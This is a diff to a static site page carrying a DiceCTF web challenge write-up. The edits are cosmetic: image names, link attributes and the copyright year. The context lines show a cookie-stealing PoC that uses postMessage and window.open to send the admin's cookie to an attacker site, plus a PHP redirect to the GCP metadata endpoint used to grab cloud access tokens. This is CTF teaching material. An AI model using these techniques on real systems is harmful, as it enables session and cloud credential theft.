@@ -212,8 +212,8 @@
   
 
   <link rel="manifest" href="/index.webmanifest">
-  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_2.png">
-  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png">
+  <link rel="icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png">
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png">
 
   <link rel="canonical" href="https://ahmed-belkahla.me/post/dice_ctf_web_writeups/">
 
@@ -280,7 +280,7 @@
     "name": "Ahmed Belkahla",
     "logo": {
       "@type": "ImageObject",
-      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_2.png"
+      "url": "https://ahmed-belkahla.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"
     }
   },
   "description": "Hello everybody , it has been a long time since I have posted a writeup :( I have been a little busy in the last period with school assignments, exams and some work (Covid has really messed up my life)."
@@ -659,7 +659,7 @@
 <pre><code>default-src none; script-src 'nonce-g+ojjmb9xLfE+3j9PsP/Ig==';
 </code></pre>
 <p><img src="https://imgur.com/sZpg1oc.png" alt="TASK"></p>
-<p>In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname &ldquo;none&rdquo; , I played a little bit with this but i reached a dead end :'( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.</p>
+<p>In fact, if we focus a little bit you can see that none is not situated between two quotation marks so it will be interpreted as the hostname &ldquo;none&rdquo; , I played a little bit with this but i reached a dead end :&rsquo;( Fortunately when I saw the source code it was obvious that the nonce is only generated once so we can reuse it.</p>
 <pre><code class="language-javascript">const express = require('express');
 const crypto = require(&quot;crypto&quot;);
 const config = require(&quot;./config.js&quot;);
@@ -889,8 +889,10 @@ app.use('/sandbox.html', (req, res, next) =&gt; {
       secure: true
 }
 </code></pre>
-<p>For this i used window.open in order to open <a href="https://web-ide.dicec.tf/ide/">https://web-ide.dicec.tf/ide/</a> and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin .
-Let&rsquo;s wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that&rsquo;s why you have to check the origin when you are using postmessages ) and open a window of <a href="https://web-ide.dicec.tf/ide/">https://web-ide.dicec.tf/ide/</a> and send the cookie to our controlled website. The final payload code :</p>
+<p>For this i used window.open in order to open 
+<a href="https://web-ide.dicec.tf/ide/" target="_blank" rel="noopener">https://web-ide.dicec.tf/ide/</a> and access the dom from the window reference , this is only possible because we are not violating the same origin policy and opening the window from the same origin .
+Let&rsquo;s wrap the things up now, we will create a webpage that when the admin visits it, we will send a postmessage to the sandbox ( that&rsquo;s why you have to check the origin when you are using postmessages ) and open a window of 
+<a href="https://web-ide.dicec.tf/ide/" target="_blank" rel="noopener">https://web-ide.dicec.tf/ide/</a> and send the cookie to our controlled website. The final payload code :</p>
 <pre><code class="language-html">&lt;html&gt;
 &lt;head&gt;
     &lt;title&gt;PoC&lt;/title&gt;
@@ -965,7 +967,8 @@ header('Location: http://metadata.google.internal/computeMetadata/v1beta1/instan
 exit;
 ?&gt;
 </code></pre>
-<p>I like tasks that don&rsquo;t need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``<a href="http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true%60%60%60">http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```</a>.
+<p>I like tasks that don&rsquo;t need a lot of code xD You can also simply use an url shortener like cuttly or bit.ly. We have the following result after redirecting it to ``
+<a href="http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true%60%60%60" target="_blank" rel="noopener">http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true```</a>.
 Notice that we are using the beta service of metadata endpoint because it doesn&rsquo;t require any additional headers to setup.</p>
 <p><img src="https://imgur.com/jVhKZIM.png" alt="TASK"></p>
 <p>If you focus on the results there is a docker image in <code>https://gcr.io/dicegang-waas/waas</code> so let&rsquo;s grab the google cloud access token and try to run the docker image , we will redirect it to the following url now</p>
@@ -1179,7 +1182,7 @@ DiceCTF was really fun and a good one to start with after some long break :D Unf
   <div class="media author-card content-widget-hr">
     
       
-      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_2.png" alt="Belkahla Ahmed">
+      <img class="avatar mr-3 avatar-circle" src="/authors/kahla/avatar_huac9af2fd1f181695ca5d7a1e646fb7d2_9022537_270x270_fill_lanczos_center_3.png" alt="Belkahla Ahmed">
     
 
     <div class="media-body">
@@ -1377,7 +1380,7 @@ DiceCTF was really fun and a good one to start with after some long break :D Unf
     
     
     
-    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>
+    <script src="/js/academic.min.1f97b17be6d67ca715feaf9deb10e550.js"></script>
 
     
 
@@ -1393,7 +1396,7 @@ DiceCTF was really fun and a good one to start with after some long break :D Unf
   
 
   <p class="powered-by">
-    © Ahmed Belkahla, 2021 &middot; 
+    © Ahmed Belkahla, 2022 &middot; 
 
     Powered by the
     <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
